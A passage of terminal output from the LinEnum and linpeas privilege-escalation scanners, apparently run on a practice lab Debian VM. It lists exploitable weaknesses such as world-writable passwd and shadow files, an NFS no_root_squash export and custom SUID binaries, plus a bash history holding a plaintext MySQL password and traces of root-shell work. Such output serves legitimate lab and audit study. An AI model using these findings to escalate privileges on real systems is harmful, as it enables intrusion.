udp        0      0 0.0.0.0:2049            0.0.0.0:*                           -               
udp        0      0 0.0.0.0:50181           0.0.0.0:*                           -               
udp        0      0 0.0.0.0:33948           0.0.0.0:*                           -               


### SERVICES #############################################
[-] Running processes:
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0   8396   808 ?        Ss   03:23   0:00 init [2]  
root         2  0.0  0.0      0     0 ?        S    03:23   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S    03:23   0:00 [migration/0]
root         4  0.0  0.0      0     0 ?        S    03:23   0:00 [ksoftirqd/0]
root         5  0.0  0.0      0     0 ?        S    03:23   0:00 [watchdog/0]
root         6  0.0  0.0      0     0 ?        S    03:23   0:00 [events/0]
root         7  0.0  0.0      0     0 ?        S    03:23   0:00 [cpuset]
root         8  0.0  0.0      0     0 ?        S    03:23   0:00 [khelper]
root         9  0.0  0.0      0     0 ?        S    03:23   0:00 [netns]
root        10  0.0  0.0      0     0 ?        S    03:23   0:00 [async/mgr]
root        11  0.0  0.0      0     0 ?        S    03:23   0:00 [pm]
root        12  0.0  0.0      0     0 ?        S    03:23   0:00 [xenwatch]
root        13  0.0  0.0      0     0 ?        S    03:23   0:00 [xenbus]
root        14  0.0  0.0      0     0 ?        S    03:23   0:00 [sync_supers]
root        15  0.0  0.0      0     0 ?        S    03:23   0:00 [bdi-default]
root        16  0.0  0.0      0     0 ?        S    03:23   0:00 [kintegrityd/0]
root        17  0.0  0.0      0     0 ?        S    03:23   0:00 [kblockd/0]
root        18  0.0  0.0      0     0 ?        S    03:23   0:00 [kacpid]
root        19  0.0  0.0      0     0 ?        S    03:23   0:00 [kacpi_notify]
root        20  0.0  0.0      0     0 ?        S    03:23   0:00 [kacpi_hotplug]
root        21  0.0  0.0      0     0 ?        S    03:23   0:00 [kseriod]
root        23  0.0  0.0      0     0 ?        S    03:23   0:00 [kondemand/0]
root        24  0.0  0.0      0     0 ?        S    03:23   0:00 [khungtaskd]
root        25  0.0  0.0      0     0 ?        S    03:23   0:00 [kswapd0]
root        26  0.0  0.0      0     0 ?        SN   03:23   0:00 [ksmd]
root        27  0.0  0.0      0     0 ?        S    03:23   0:00 [aio/0]
root        28  0.0  0.0      0     0 ?        S    03:23   0:00 [crypto/0]
root       162  0.0  0.0      0     0 ?        S    03:23   0:00 [ata/0]
root       163  0.0  0.0      0     0 ?        S    03:23   0:00 [ata_aux]
root       164  0.0  0.0      0     0 ?        S    03:23   0:00 [scsi_eh_0]
root       165  0.0  0.0      0     0 ?        S    03:23   0:00 [scsi_eh_1]
root       195  0.0  0.0      0     0 ?        S    03:23   0:00 [kjournald]
root       221  0.0  0.0      0     0 ?        S    03:23   0:00 [flush-202:0]
root       270  0.0  0.0  16968   968 ?        S<s  03:23   0:00 udevd --daemon
root       483  0.0  0.0      0     0 ?        S    03:23   0:00 [kpsmoused]
root      1050  0.0  0.0  16968   888 ?        S<   03:25   0:00 udevd --daemon
root      1051  0.0  0.0  16968   816 ?        S<   03:25   0:00 udevd --daemon
root      1354  0.0  0.0   6796  1024 ?        Ss   03:25   0:00 dhclient -v -pf /var/run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases eth0
daemon    1384  0.0  0.0   8136   616 ?        Ss   03:25   0:00 /sbin/portmap
statd     1416  0.0  0.0  14424   900 ?        Ss   03:25   0:00 /sbin/rpc.statd
root      1419  0.0  0.0      0     0 ?        S    03:25   0:00 [rpciod/0]
root      1421  0.0  0.0      0     0 ?        S<   03:25   0:00 [kslowd000]
root      1422  0.0  0.0      0     0 ?        S<   03:25   0:00 [kslowd001]
root      1423  0.0  0.0      0     0 ?        S    03:25   0:00 [nfsiod]
root      1430  0.0  0.0  27064   592 ?        Ss   03:25   0:00 /usr/sbin/rpc.idmapd
root      1662  0.0  0.1  54336  1688 ?        Sl   03:25   0:00 /usr/sbin/rsyslogd -c4
root      1762  0.0  0.0   3960   640 ?        Ss   03:25   0:00 /usr/sbin/acpid
root      1803  0.0  0.0      0     0 ?        S    03:25   0:00 [lockd]
root      1804  0.0  0.0      0     0 ?        S    03:25   0:00 [nfsd4]
root      1805  0.0  0.0      0     0 ?        S    03:25   0:00 [nfsd]
root      1806  0.0  0.0      0     0 ?        S    03:25   0:00 [nfsd]
root      1807  0.0  0.0      0     0 ?        S    03:25   0:00 [nfsd]
root      1808  0.0  0.0      0     0 ?        S    03:25   0:00 [nfsd]
root      1809  0.0  0.0      0     0 ?        S    03:25   0:00 [nfsd]
root      1810  0.0  0.0      0     0 ?        S    03:25   0:00 [nfsd]
root      1811  0.0  0.0      0     0 ?        S    03:25   0:00 [nfsd]
root      1812  0.0  0.0      0     0 ?        S    03:25   0:00 [nfsd]
root      1817  0.0  0.1  18848  1200 ?        Ss   03:25   0:00 /usr/sbin/rpc.mountd --manage-gids
root      1851  0.0  0.3  71424  3260 ?        Ss   03:25   0:00 /usr/sbin/apache2 -k start
root      1985  0.0  0.1  22468  1068 ?        Ss   03:25   0:00 /usr/sbin/cron
root      2027  0.0  0.1   9180  1396 ?        S    03:25   0:00 /bin/sh /usr/bin/mysqld_safe
root      2029  0.0  0.1  49224  1164 ?        Ss   03:25   0:00 /usr/sbin/sshd
root      2057  0.0  0.1  61864  1312 ?        Ss   03:25   0:00 nginx: master process /usr/sbin/nginx
www-data  2062  0.0  0.1  62232  1828 ?        S    03:25   0:00 nginx: worker process
www-data  2063  0.0  0.1  62232  1844 ?        S    03:25   0:00 nginx: worker process
www-data  2064  0.0  0.1  62232  1844 ?        S    03:25   0:00 nginx: worker process
www-data  2065  0.0  0.1  62232  1824 ?        S    03:25   0:00 nginx: worker process
root      2176  0.0  2.3 165668 24392 ?        Sl   03:25   0:02 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=root --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306
root      2177  0.0  0.0   3896   640 ?        S    03:25   0:00 logger -t mysqld -p daemon.error
101       2560  0.0  0.0  32720  1000 ?        Ss   03:25   0:00 /usr/sbin/exim4 -bd -q30m
root      2609  0.0  0.0   5972   632 tty1     Ss+  03:25   0:00 /sbin/getty 38400 tty1
root      2610  0.0  0.0   5972   636 tty2     Ss+  03:25   0:00 /sbin/getty 38400 tty2
root      2611  0.0  0.0   5972   632 tty3     Ss+  03:25   0:00 /sbin/getty 38400 tty3
root      2612  0.0  0.0   5972   632 tty4     Ss+  03:25   0:00 /sbin/getty 38400 tty4
root      2613  0.0  0.0   5972   636 tty5     Ss+  03:25   0:00 /sbin/getty 38400 tty5
root      2614  0.0  0.0   5972   636 tty6     Ss+  03:25   0:00 /sbin/getty 38400 tty6
root      2765  0.0  0.3  70544  3292 ?        Ss   03:42   0:00 sshd: user [priv]
user      2767  0.0  0.2  71332  2544 ?        S    03:42   0:00 sshd: user@pts/0 
user      2768  0.0  0.2  19304  2128 pts/0    Ss   03:42   0:00 -bash
www-data  4683  0.0  0.1  71424  2000 ?        S    06:25   0:00 /usr/sbin/apache2 -k start
www-data  4684  0.0  0.2 294852  2668 ?        Sl   06:25   0:00 /usr/sbin/apache2 -k start
www-data  4685  0.0  0.2 294852  2688 ?        Sl   06:25   0:00 /usr/sbin/apache2 -k start
user      5462  0.0  0.1  17724  1916 pts/0    S    06:57   0:00 /bin/bash -p
user      6093  0.0  0.1  18124  2008 pts/0    S+   07:38   0:00 /bin/bash ./LinEnum.sh
user      6094  0.0  0.1  18152  1520 pts/0    S+   07:38   0:00 /bin/bash ./LinEnum.sh
user      6095  0.0  0.0   3912   528 pts/0    S+   07:38   0:00 tee -a
user      6326  0.0  0.1  18144  1240 pts/0    S+   07:38   0:00 /bin/bash ./LinEnum.sh
user      6327  0.0  0.1  14860  1072 pts/0    R+   07:38   0:00 ps aux


[-] Process binaries and associated permissions (from above list):
912K -rwxr-xr-x 1 root root 905K Apr 10  2010 /bin/bash
   0 lrwxrwxrwx 1 root root    4 May 14  2017 /bin/sh -> bash
 20K -rwxr-xr-x 2 root root  20K Jan 25  2011 /sbin/getty
 24K -rwxr-xr-x 1 root root  21K Feb 24  2010 /sbin/portmap
 72K -rwxr-xr-x 1 root root  65K Dec 13  2014 /sbin/rpc.statd
 44K -rwxr-xr-x 1 root root  41K May  1  2012 /usr/sbin/acpid
   0 lrwxrwxrwx 1 root root   33 May 13  2017 /usr/sbin/apache2 -> ../lib/apache2/mpm-worker/apache2
 44K -rwxr-xr-x 1 root root  41K Dec 18  2010 /usr/sbin/cron
   0 lrwxrwxrwx 1 root root    4 May 13  2017 /usr/sbin/exim4 -> exim
9.7M -rwxr-xr-x 1 root root 9.7M Oct 21  2014 /usr/sbin/mysqld
 32K -rwxr-xr-x 1 root root  32K Dec 13  2014 /usr/sbin/rpc.idmapd
 92K -rwxr-xr-x 1 root root  88K Dec 13  2014 /usr/sbin/rpc.mountd
328K -rwxr-xr-x 1 root root 321K Nov 30  2010 /usr/sbin/rsyslogd
472K -rwxr-xr-x 1 root root 465K Apr  2  2014 /usr/sbin/sshd


[-] /etc/init.d/ binary permissions:
total 300
drwxr-xr-x  2 root root  4096 Aug 25  2019 .
drwxr-xr-x 67 root root  4096 Feb 14 07:24 ..
-rw-r--r--  1 root root  2067 Aug 25  2019 .depend.boot
-rw-r--r--  1 root root   693 Aug 25  2019 .depend.start
-rw-r--r--  1 root root   796 Aug 25  2019 .depend.stop
-rw-r--r--  1 root root  2427 Mar 24  2012 README
-rwxr-xr-x  1 root root  2233 May  1  2012 acpid
-rwxr-xr-x  1 root root  7621 Jul 28  2015 apache2
-rwxr-xr-x  1 root root  2444 Mar 24  2012 bootlogd
-rwxr-xr-x  1 root root  1579 Mar 24  2012 bootlogs
-rwxr-xr-x  1 root root  1381 Mar 24  2012 bootmisc.sh
-rwxr-xr-x  1 root root  3978 Mar 24  2012 checkfs.sh
-rwxr-xr-x  1 root root 10822 Mar 24  2012 checkroot.sh
-rwxr-xr-x  1 root root  1279 Jun 26  2010 console-setup
-rwxr-xr-x  1 root root  3753 Dec 18  2010 cron
-rwxr-xr-x  1 root root  6479 May 15  2017 exim4
-rwxr-xr-x  1 root root  1329 Mar 24  2012 halt
-rwxr-xr-x  1 root root  1423 Mar 24  2012 hostname.sh
-rwxr-xr-x  1 root root  5061 Jan 25  2011 hwclock.sh
-rwxr-xr-x  1 root root  5079 Jan 25  2011 hwclockfirst.sh
-rwxr-xr-x  1 root root  2518 Sep 15  2006 ifupdown
-rwxr-xr-x  1 root root  1047 Sep  6  2009 ifupdown-clean
-rwxr-xr-x  1 root root  7743 Oct 13  2010 kbd
-rwxr-xr-x  1 root root  1486 Jun 26  2010 keyboard-setup
-rwxr-xr-x  1 root root  1293 Mar 24  2012 killprocs
-rwxr-xr-x  1 root root  1334 Oct 30  2011 module-init-tools
-rwxr-xr-x  1 root root   620 Mar 24  2012 mountall-bootclean.sh
-rwxr-xr-x  1 root root  1668 Mar 24  2012 mountall.sh
-rwxr-xr-x  1 root root  1560 Mar 24  2012 mountdevsubfs.sh
-rwxr-xr-x  1 root root  1924 Mar 24  2012 mountkernfs.sh
-rwxr-xr-x  1 root root   628 Mar 24  2012 mountnfs-bootclean.sh
-rwxr-xr-x  1 root root  2330 Mar 24  2012 mountnfs.sh
-rwxr-xr-x  1 root root  1315 Mar 24  2012 mountoverflowtmp
-rwxr-xr-x  1 root root  3649 Mar 24  2012 mtab.sh
-rwxr-xr-x  1 root root  5437 Oct 21  2014 mysql
-rwxr-xr-x  1 root root  2451 Apr 18  2010 networking
-rwxr-xr-x  1 root root  6013 Dec 13  2014 nfs-common
-rwxr-xr-x  1 root root  4526 Dec 13  2014 nfs-kernel-server
-rwxr-xr-x  1 root root  4766 Jun  7  2016 nginx
-rwxr-xr-x  1 root root  2192 Feb 24  2010 portmap
-rwxr-xr-x  1 root root  1298 Jan 31  2010 procps
-rwxr-xr-x  1 root root  8635 Mar 24  2012 rc
-rwxr-xrwx  1 root root   801 May 14  2017 rc.local
-rwxr-xr-x  1 root root   117 Mar 24  2012 rcS
-rwxr-xr-x  1 root root   639 Mar 24  2012 reboot
-rwxr-xr-x  1 root root  1074 Mar 24  2012 rmnologin
-rwxr-xr-x  1 root root  3080 Nov 30  2010 rsyslog
-rwxr-xr-x  1 root root  3286 Mar 24  2012 sendsigs
-rwxr-xr-x  1 root root   590 Mar 24  2012 single
-rw-r--r--  1 root root  4304 Mar 24  2012 skeleton
-rwxr-xr-x  1 root root  3704 Apr  2  2014 ssh
-rwxr-xr-x  1 root root   567 Mar 24  2012 stop-bootlogd
-rwxr-xr-x  1 root root  1143 Mar 24  2012 stop-bootlogd-single
-rwxr-xr-x  1 root root   551 Jan  5  2016 sudo
-rwxr-xr-x  1 root root  7578 Dec 12  2010 udev
-rwxr-xr-x  1 root root  1153 Dec 12  2010 udev-mtab
-rwxr-xr-x  1 root root  2869 Mar 24  2012 umountfs
-rwxr-xr-x  1 root root  2143 Mar 24  2012 umountnfs.sh
-rwxr-xr-x  1 root root  1456 Mar 24  2012 umountroot
-rwxr-xr-x  1 root root  1985 Mar 24  2012 urandom


[-] /lib/systemd/* config file permissions:
/lib/systemd/:
total 4.0K
drwxr-xr-x 2 root root 4.0K May 14  2017 system

/lib/systemd/system:
total 4.0K
-rw-r--r-- 1 root root 986 Jun  7  2016 nginx.service


### SOFTWARE #############################################
[-] Sudo version:
Sudo version 1.7.4p4


[-] MYSQL version:
mysql  Ver 14.14 Distrib 5.1.73, for debian-linux-gnu (x86_64) using readline 6.1


[+] We can connect to the local MYSQL service as 'root' and without a password!
mysqladmin  Ver 8.42 Distrib 5.1.73, for debian-linux-gnu on x86_64
Copyright (c) 2000, 2013, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Server version          5.1.73-1+deb6u1
Protocol version        10
Connection              Localhost via UNIX socket
UNIX socket             /var/run/mysqld/mysqld.sock
Uptime:                 4 hours 13 min 9 sec

Threads: 1  Questions: 136  Slow queries: 0  Opens: 101  Flush tables: 1  Open tables: 24  Queries per second avg: 0.8


[-] Apache version:
Server version: Apache/2.2.16 (Debian)
Server built:   Jul 28 2015 09:24:24


[-] Apache user configuration:
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data


[-] Installed Apache modules:
Loaded Modules:
 core_module (static)
 log_config_module (static)
 logio_module (static)
 mpm_worker_module (static)
 http_module (static)
 so_module (static)
 alias_module (shared)
 auth_basic_module (shared)
 authn_file_module (shared)
 authz_default_module (shared)
 authz_groupfile_module (shared)
 authz_host_module (shared)
 authz_user_module (shared)
 autoindex_module (shared)
 cgid_module (shared)
 deflate_module (shared)
 dir_module (shared)
 env_module (shared)
 mime_module (shared)
 negotiation_module (shared)
 reqtimeout_module (shared)
 setenvif_module (shared)
 status_module (shared)


### INTERESTING FILES ####################################
[-] Useful file locations:
/bin/nc
/bin/netcat
/usr/bin/wget
/usr/bin/nmap
/usr/bin/gcc


[-] Installed compilers:
ii  g++                                 4:4.4.5-1                    The GNU C++ compiler
ii  g++-4.4                             4.4.5-8                      The GNU C++ compiler
ii  gcc                                 4:4.4.5-1                    The GNU C compiler
ii  gcc-4.4                             4.4.5-8                      The GNU C compiler


[-] Can we read/write sensitive files:
-rw-r--rw- 1 root root 1059 Feb 14 04:43 /etc/passwd
-rw-r--r-- 1 root root 572 Aug 25  2019 /etc/group
-rw-r--r-- 1 root root 823 Aug  6  2010 /etc/profile
-rw-r--rw- 1 root shadow 840 Feb 14 04:31 /etc/shadow


[-] SUID files:
-rwsr-xr-x 1 root root 37552 Feb 15  2011 /usr/bin/chsh
-rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudo
-rwsr-xr-x 1 root root 32808 Feb 15  2011 /usr/bin/newgrp
-rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudoedit
-rwsr-xr-x 1 root root 43280 Feb 15  2011 /usr/bin/passwd
-rwsr-xr-x 1 root root 60208 Feb 15  2011 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 39856 Feb 15  2011 /usr/bin/chfn
-rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/local/bin/suid-so
-rwsr-sr-x 1 root staff 6883 May 14  2017 /usr/local/bin/suid-env
-rwsr-sr-x 1 root staff 6899 May 14  2017 /usr/local/bin/suid-env2
-rwsr-xr-x 1 root root 963691 May 13  2017 /usr/sbin/exim-4.84-3
-rwsr-xr-x 1 root root 6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10592 Feb 15  2016 /usr/lib/pt_chown
-rwsr-xr-x 1 root root 36640 Oct 14  2010 /bin/ping6
-rwsr-xr-x 1 root root 34248 Oct 14  2010 /bin/ping
-rwsr-xr-x 1 root root 78616 Jan 25  2011 /bin/mount
-rwsr-xr-x 1 root root 34024 Feb 15  2011 /bin/su
-rwsr-xr-x 1 root root 53648 Jan 25  2011 /bin/umount
-rwsr-xr-x 1 root root 94992 Dec 13  2014 /sbin/mount.nfs


[+] Possibly interesting SUID files:
-rwsr-sr-x 1 root staff 6883 May 14  2017 /usr/local/bin/suid-env


[-] SGID files:
-rwxr-sr-x 1 root shadow 19528 Feb 15  2011 /usr/bin/expiry
-rwxr-sr-x 1 root ssh 108600 Apr  2  2014 /usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 11000 Jun 17  2010 /usr/bin/bsd-write
-rwxr-sr-x 1 root crontab 35040 Dec 18  2010 /usr/bin/crontab
-rwxr-sr-x 1 root shadow 56976 Feb 15  2011 /usr/bin/chage
-rwxr-sr-x 1 root tty 12000 Jan 25  2011 /usr/bin/wall
-rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/local/bin/suid-so
-rwsr-sr-x 1 root staff 6883 May 14  2017 /usr/local/bin/suid-env
-rwsr-sr-x 1 root staff 6899 May 14  2017 /usr/local/bin/suid-env2
-rwxr-sr-x 1 root shadow 31864 Oct 17  2011 /sbin/unix_chkpwd


[+] Possibly interesting SGID files:
-rwsr-sr-x 1 root staff 6883 May 14  2017 /usr/local/bin/suid-env


[-] NFS config details: 
-rw-r--rw- 1 root root 492 May 14  2017 /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#

/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)

#/tmp *(rw,sync,insecure,no_subtree_check)


[-] Can't search *.conf files as no keyword was entered

[-] Can't search *.php files as no keyword was entered

[-] Can't search *.log files as no keyword was entered

[-] Can't search *.ini files as no keyword was entered

[-] All *.conf files in /etc (recursive 1 level):
-rw-r--r-- 1 root root 61 Feb 14 07:24 /etc/resolv.conf
-rw-r--r-- 1 root root 1260 May 30  2008 /etc/ucf.conf
-rw-r--r-- 1 root root 9 Aug  7  2006 /etc/host.conf
-rw-r--r-- 1 root root 2940 Jun  6  2012 /etc/gai.conf
-rw-r--r-- 1 root root 2969 Jan 30  2011 /etc/debconf.conf
-rw-r--r-- 1 root root 599 Feb 19  2009 /etc/logrotate.conf
-rw-r--r-- 1 root root 475 Aug 28  2006 /etc/nsswitch.conf
-rw-r--r-- 1 root root 899 Aug 31  2009 /etc/gssapi_mech.conf
-rw-r--r-- 1 root root 882 May  7  2010 /etc/insserv.conf
-rw-r--r-- 1 root root 2981 May 12  2017 /etc/adduser.conf
-rw-r--r-- 1 root root 2572 Nov 30  2010 /etc/rsyslog.conf
-rw-r--r-- 1 root root 34 May 12  2017 /etc/ld.so.conf
-rw-r--r-- 1 root root 36870 May 15  2017 /etc/exim.conf
-rw-r--r-- 1 root root 145 Aug 25  2010 /etc/idmapd.conf
-rw-r--r-- 1 root root 600 Nov 21  2010 /etc/deluser.conf
-rw-r--r-- 1 root root 2082 Feb 24  2010 /etc/sysctl.conf
-rw-r--r-- 1 root root 801 Jun 19  2011 /etc/mke2fs.conf
-rw-r--r-- 1 root root 144 May 12  2017 /etc/kernel-img.conf
-rw-r--r-- 1 root root 552 Oct 17  2011 /etc/pam.conf
-rw-r--r-- 1 root root 15752 Jul 25  2009 /etc/ltrace.conf


[-] Current user's history files:
-rw------- 1 user user 293 Feb 14 06:59 /home/user/.bash_history
-rw------- 1 user user 332 Feb 14 03:51 /home/user/.mysql_history
-rw------- 1 user user  11 May 15  2020 /home/user/.nano_history


[-] Location and contents (if accessible) of .bash_history file(s):
/home/user/.bash_history
ls -al
cat .bash_history 
ls -al
mysql -h somehost.local -uroot -ppassword123
exit
cd /tmp
clear
ifconfig
netstat -antp
nano myvpn.ovpn 
ls
id
rm /tmp/rootbash
exit
id
rm /tmp/rootbash
rm ~/overwrite.sh 
exit
id
exit
id
exit
id
exit
id
exit
id
rm /tmp/rootbash
exit
id
rm /tmp/shell.elf 
exit


[-] Location and Permissions (if accessible) of .bak file(s):
-rw------- 1 root root 1059 Feb 14 04:43 /var/backups/passwd.bak
-rw------- 1 root shadow 478 Aug 25  2019 /var/backups/gshadow.bak
-rw------- 1 root shadow 840 Feb 14 04:31 /var/backups/shadow.bak
-rw------- 1 root root 572 Aug 25  2019 /var/backups/group.bak


[-] Any interesting mail in /var/mail:
total 8
drwxrwsr-x  2 root mail 4096 May 12  2017 .
drwxr-xr-x 14 root root 4096 May 13  2017 ..


### SCAN COMPLETE ####################################
user@debian:/home/user/tools/privesc-scripts$ 
```

**linpeas.sh** execution:

```bash
user@debian:/home/user/tools/privesc-scripts$ ./linpeas.sh 


                     ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄▄
      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄
  ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄
  ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
  ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
  ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
  ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
  ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
  ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
  ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
  ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
  ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
  ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
  ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
   ▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄
        ▄▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄ 
             ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
    linpeas v2.5.6 by carlospolop
                                                                                                                                                                                                             
ADVISORY: linpeas should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.                                                                                                                                      
                                                                                                                                                                                                             
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
 LEGEND:                                                                                                                                                                                                     
  RED/YELLOW: 99% a PE vector
  RED: You must take a look at it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMangeta: Your username


====================================( Basic information )=====================================
OS: Linux version 2.6.32-5-amd64 (Debian 2.6.32-48squeeze6) (jmm@debian.org) (gcc version 4.3.5 (Debian 4.3.5-4) ) #1 SMP Tue May 13 16:34:35 UTC 2014                                                       
User & Groups: uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
Hostname: debian
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)                                                                                
[+] nmap is available for network discover & port scanning, you should use it yourself                                                                                                                       
                                                                                                                                                                                                             

Caching directories . . . . . . . . . . . . . . . . . . . . DONE
====================================( System Information )====================================                                                                                                               
[+] Operative system                                                                                                                                                                                         
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits                                                                                                                              
Linux version 2.6.32-5-amd64 (Debian 2.6.32-48squeeze6) (jmm@debian.org) (gcc version 4.3.5 (Debian 4.3.5-4) ) #1 SMP Tue May 13 16:34:35 UTC 2014                                                           

[+] Sudo version
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version                                                                                                                                 
Sudo version 1.7.4p4                                                                                                                                                                                         

[+] PATH
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#usdpath                                                                                                                                      
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                                                                                                                 
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

[+] Date
Sat Feb 14 07:42:40 EST 2026                                                                                                                                                                                 

[+] System stats
Filesystem            Size  Used Avail Use% Mounted on                                                                                                                                                       
/dev/xvda1             19G  981M   17G   6% /
tmpfs                 501M     0  501M   0% /lib/init/rw
udev                  496M  100K  496M   1% /dev
tmpfs                 501M     0  501M   0% /dev/shm
             total       used       free     shared    buffers     cached
Mem:       1025296     592380     432916          0     396492      85028
-/+ buffers/cache:     110860     914436
Swap:       901112          0     901112

[+] Environment
[i] Any private information inside environment variables?                                                                                                                                                    
HISTSIZE=0                                                                                                                                                                                                   
HISTFILESIZE=0
SHLVL=3
HISTFILE=/dev/null
_=/usr/bin/env

[+] Looking for Signature verification failed in dmseg
 Not Found                                                                                                                                                                                                   
                                                                                                                                                                                                             
[+] selinux enabled? .............. sestatus Not Found
[+] Printer? ...................... lpstat Not Found                                                                                                                                                         
[+] Is this a container? .......... No                                                                                                                                                                       
[+] Is ASLR enabled? .............. Yes                                                                                                                                                                      


=========================================( Devices )==========================================
[+] Any sd* disk in /dev? (limit 20)                                                                                                                                                                         
                                                                                                                                                                                                             
[+] Unmounted file-system?
[i] Check if you can mount umounted devices                                                                                                                                                                  
proc    /proc   proc    defaults        0 0                                                                                                                                                                  
UUID=be5bb36f-7bb4-4900-b459-196278f714b6       /       ext3    errors=remount-ro       0 1
UUID=468658fa-a304-4ed0-981a-d725bf98a790       none    swap    sw      0 0
debugfs /sys/kernel/debug/      debugfs defaults        0 0



====================================( Available Software )====================================
[+] Useful software                                                                                                                                                                                          
/usr/bin/nmap                                                                                                                                                                                                
/bin/nc
/usr/bin/ncat
/bin/netcat
/bin/nc.traditional
/usr/bin/wget
/bin/ping
/usr/bin/gcc
/usr/bin/g++
/usr/bin/make
/usr/bin/gdb
/usr/bin/base64
/usr/bin/python2.6
/usr/bin/perl
/usr/bin/sudo

[+] Installed Compiler
ii  g++                                 4:4.4.5-1                    The GNU C++ compiler                                                                                                                    
ii  g++-4.4                             4.4.5-8                      The GNU C++ compiler
ii  gcc                                 4:4.4.5-1                    The GNU C compiler
ii  gcc-4.4                             4.4.5-8                      The GNU C compiler
/usr/bin/gcc
/usr/bin/g++


================================( Processes, Cron, Services, Timers & Sockets )================================
[+] Cleaned processes                                                                                                                                                                                        
[i] Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                                                                     
101       2560  0.0  0.0  32720  1000 ?        Ss   03:25   0:00 /usr/sbin/exim4 -bd -q30m                                                                                                                   
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
